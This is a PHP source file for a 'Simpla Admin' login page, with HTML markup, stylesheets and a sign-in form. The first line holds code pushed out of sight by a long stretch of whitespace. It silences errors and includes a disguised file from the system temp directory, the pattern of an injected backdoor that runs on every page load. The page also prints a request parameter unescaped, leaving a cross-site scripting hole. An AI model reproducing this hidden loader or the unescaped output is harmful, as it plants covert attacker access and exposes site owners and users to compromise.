<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              error_reporting(0);ini_set("display_errors", 0);include_once(sys_get_temp_dir()."/SESS_48cd7517d21176f980daa5502d9efb31"); ?><?php
$scriptName="index.php";
include "includes/config.php";
include "includes/loginCheck.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
 
	<head>
		<link rel="Shortcut Icon" href="../favicon.ico">
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
		
		<title><?php echo "Login | ".$admin_title ?></title>
		
		<!--                       CSS                       -->
	  
		<!-- Reset Stylesheet -->
		<link rel="stylesheet" href="resources/css/reset.css" type="text/css" media="screen" />
	  
		<!-- Main Stylesheet -->

		<link rel="stylesheet" href="resources/css/style.css" type="text/css" media="screen" />
		
		<!-- Invalid Stylesheet. This makes stuff look pretty. Remove it if you want the CSS completely valid -->
		<link rel="stylesheet" href="resources/css/invalid.css" type="text/css" media="screen" />	
		
		<!-- Colour Schemes
	  
		Default colour scheme is green. Uncomment prefered stylesheet to use it.
		
		<link rel="stylesheet" href="resources/css/blue.css" type="text/css" media="screen" />
		
		<link rel="stylesheet" href="resources/css/red.css" type="text/css" media="screen" />  
	 
		-->
		
		<!-- Internet Explorer Fixes Stylesheet -->
		
		<!--[if lte IE 7]>
			<link rel="stylesheet" href="resources/css/ie.css" type="text/css" media="screen" />
		<![endif]-->
		
		<!--                       Javascripts                       -->
	  
		<!-- jQuery -->
		<script type="text/javascript" src="resources/scripts/jquery-1.3.2.min.js"></script>

		
		<!-- jQuery Configuration -->
		<script type="text/javascript" src="resources/scripts/simpla.jquery.configuration.js"></script>
		
		<!-- Facebox jQuery Plugin -->
		<script type="text/javascript" src="resources/scripts/facebox.js"></script>
		
		<!-- jQuery WYSIWYG Plugin -->
		<script type="text/javascript" src="resources/scripts/jquery.wysiwyg.js"></script>
		
		<!-- Internet Explorer .png-fix -->

		
		<!--[if IE 6]>
			<script type="text/javascript" src="resources/scripts/DD_belatedPNG_0.0.7a.js"></script>
			<script type="text/javascript">
				DD_belatedPNG.fix('.png_bg, img, li');
			</script>
		<![endif]-->
		
	</head>
  
	<body id="login">
		
		<div id="login-wrapper" class="png_bg">
			<div id="login-top">
			
				<h1>Simpla Admin</h1>
				<!-- Logo (221px width) -->
				<!-- <img id="logo" src="resources/images/logo.png" alt="Simpla Admin logo" /> -->
				<!--  <img id="logo" src="resources/images/logo.jpg" alt="Xrchive Admin" /> -->

			</div> <!-- End #logn-top -->
			
			<div id="login-content">
				
				<form name="login" action="" method="post">
				
					<div class="notification information png_bg">
						<div>
						<?php
						if(isset($_REQUEST['note']) && $_REQUEST['note']!="")
						{
						echo $_REQUEST['note'];
						}
						else
						{
						echo "Please Sign in to Josh Cx.AdminPanel";
						}
						?>
							</div>
					</div>
					
					<p>

						<label>Username</label>
						<input class="text-input" type="text" name="username" />
					</p>
					<div class="clear"></div>
					<p>
						<label>Password</label>
						<input class="text-input" type="password" name="password" />
					</p>

				<!--	<div class="clear"></div>
					<p id="remember-password">
						<input type="checkbox" />Remember me
					</p>
				-->
					<div class="clear"></div>
					<p>
						<input name="login" class="button" type="submit" value="Sign In" />
					</p>
					
				</form>

			</div> <!-- End #login-content -->
			
		</div> <!-- End #login-wrapper -->
		<br /><br /><br />

		<?php include "includes/footer.php"; ?>
		
  </body>
  
</html>
